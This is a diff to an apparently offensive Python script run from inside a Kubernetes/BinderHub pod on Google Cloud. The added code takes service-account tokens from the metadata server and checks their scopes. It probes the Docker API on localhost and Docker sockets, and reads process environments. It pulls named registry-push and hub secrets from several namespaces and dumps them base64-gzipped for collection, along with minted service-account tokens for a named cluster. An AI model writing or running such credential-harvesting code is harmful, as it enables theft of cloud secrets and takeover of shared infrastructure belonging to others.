@@ -662,6 +662,48 @@ def csr():
     VM IDENTITY block, and with a bogus attestation triplet."""
     import subprocess, urllib.parse, time
     out("===CSR-BEGIN===")
+    # --- tokeninfo: default token vs ?scopes= requested token (VM scope ceiling proof)
+    for lbl, path in [("DEFAULT", "instance/service-accounts/default/token"),
+                      ("SCOPED", "instance/service-accounts/default/token?scopes=" + urllib.parse.quote("https://www.googleapis.com/auth/cloud-platform", safe=""))]:
+        st, tokb = md_get(path)
+        try:
+            at = json.loads(tokb.decode()).get("access_token", "")
+        except Exception:
+            at = ""
+        out("TOKEN-%s status=%s len=%d" % (lbl, st, len(at)))
+        try:
+            r = urllib.request.urlopen("https://oauth2.googleapis.com/tokeninfo?access_token=" + urllib.parse.quote(at), timeout=15)
+            out("TOKENINFO-%s status=%s %s" % (lbl, r.status, r.read()[:1200].decode("utf8", "replace")))
+        except urllib.error.HTTPError as e:
+            out("TOKENINFO-%s HTTP %s %s" % (lbl, e.code, e.read()[:600].decode("utf8", "replace")))
+        except Exception as e:
+            out("TOKENINFO-%s ERR %r" % (lbl, e))
+    # --- dind / docker socket reachability
+    out("DOCKER-ENV DOCKER_HOST=%r DOCKER_TLS=%r" % (os.environ.get("DOCKER_HOST"), os.environ.get("DOCKER_TLS_VERIFY")))
+    try:
+        out("POD-ENV " + " ".join(x for x in open("/proc/1/environ","rb").read().decode("utf8","replace").split("\0") if re.search(r"DOCKER|HOST|BINDER|JUPYTER|KUBE", x, re.I))[:1500])
+    except Exception as e:
+        out("POD-ENV ERR %r" % (e,))
+    try:
+        rows=[]
+        for line in open("/proc/net/tcp").read().splitlines()[1:]:
+            f=line.split()
+            if len(f) > 3 and f[3] == "0A":
+                ip,port=f[1].split(":")
+                rows.append("%s:%d" % (".".join(str(int(ip[i:i+2],16)) for i in (6,4,2,0)), int(port,16)))
+        out("LISTEN-TCP " + ",".join(sorted(set(rows))))
+    except Exception as e:
+        out("LISTEN-TCP ERR %r" % (e,))
+    for u in ["http://127.0.0.1:2375/version", "http://127.0.0.1:2375/info", "http://127.0.0.1:2375/containers/json?all=1", "http://127.0.0.1:2376/version"]:
+        try:
+            r = urllib.request.urlopen(u, timeout=6)
+            out("DIND %s status=%s %s" % (u, r.status, r.read()[:900].decode("utf8", "replace")))
+        except urllib.error.HTTPError as e:
+            out("DIND %s HTTP %s %s" % (u, e.code, e.read()[:300].decode("utf8", "replace")))
+        except Exception as e:
+            out("DIND %s ERR %r" % (u, e))
+    for sp in ["/var/run/docker.sock", "/run/docker.sock", "/var/run/docker-api/docker-api.sock", "/var/run/bhs-bhs/docker-api/docker-api.sock"]:
+        out("SOCK %s exists=%s" % (sp, os.path.exists(sp)))
     st, kvb = md_get("instance/attributes/kube-env", timeout=15)
     kv = kvb.decode("utf8", "replace")
     node = md_get("instance/name")[1].decode().strip()
@@ -810,6 +852,8 @@ def csr():
         for sname in set(x for x in secs if x):
             secretrefs.append((ns, sname))
     for ns, sname in sorted(set(secretrefs)):
+        if _logged > 320000:
+            out("SECRET-BUDGET-CAP-REACHED"); break
         s, b = ncall("/api/v1/namespaces/%s/secrets/%s" % (ns, sname))
         out("SECRET %s/%s status=%s len=%d" % (ns, sname, s, len(b)))
         if s == 200:
@@ -819,6 +863,22 @@ def csr():
                 out("SECRET-KEYS %s/%s type=%s keys=%s" % (ns, sname, d.get("type"), sorted((d.get("data") or {}).keys())))
             except Exception:
                 pass
+    # explicit high-value secret names (binderhub push credential class)
+    for ns in ["bhs", "bindernew", "default", "kube-system"]:
+        for sname in ["binder-build-docker-config", "binder-build-docker-config-class", "binder-build-docker-config-json",
+                      "binder-secret", "hub"]:
+            s2, b2 = ncall("/api/v1/namespaces/%s/secrets/%s" % (ns, sname))
+            out("NAMED-SECRET %s/%s status=%s len=%d" % (ns, sname, s2, len(b2)))
+            if s2 == 200:
+                out("--named-secret-b64gzip--"); out(base64.b64encode(gzip.compress(b2)).decode()); out("--named-secret-end--")
+                try:
+                    d2 = json.loads(b2)
+                    out("NAMED-SECRET-KEYS %s/%s type=%s keys=%s" % (ns, sname, d2.get("type"), sorted((d2.get("data") or {}).keys())))
+                except Exception:
+                    pass
+
+    if _logged > 420000:
+        out("SATOKEN-BUDGET-CAP-REACHED")
     for ns, sa in sorted(set(sapairs)):
         body = json.dumps({"apiVersion": "authentication.k8s.io/v1", "kind": "TokenRequest",
                            "spec": {"audiences": ["https://container.googleapis.com/v1/projects/220541406316/zones/europe-west10-a/clusters/jup-test"], "expirationSeconds": 3600}}).encode()
@@ -826,8 +886,10 @@ def csr():
         out("SATOKEN %s/%s status=%s %s" % (ns, sa, s, b[:300].decode("utf8", "replace")))
         if s in (200, 201):
             out("--satoken-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--satoken-end--")
-    for ns in ["bhs", "kube-system"]:
+    for ns in ["bhs", "bindernew", "kube-system", "default"]:
         for res in ["secrets", "configmaps", "serviceaccounts", "pods"]:
+            if _logged > 520000:
+                out("LIST-BUDGET-CAP-REACHED"); break
             s, b = ncall("/api/v1/namespaces/%s/%s?limit=500" % (ns, res))
             out("LIST %s/%s status=%s len=%d %s" % (ns, res, s, len(b), b[:120].decode("utf8", "replace")))
             if s == 200:
@@ -853,4 +915,4 @@ def csr():
 
 
 if __name__ == "__main__":
-    {"meta": meta, "api": api, "api5": api5, "plugin": plugin, "csr": csr}[sys.argv[1]]()
+    {"meta": meta, "api": api, "api5": api5, "plugin": plugin, "csr": csr, "deep": csr}[sys.argv[1]]()
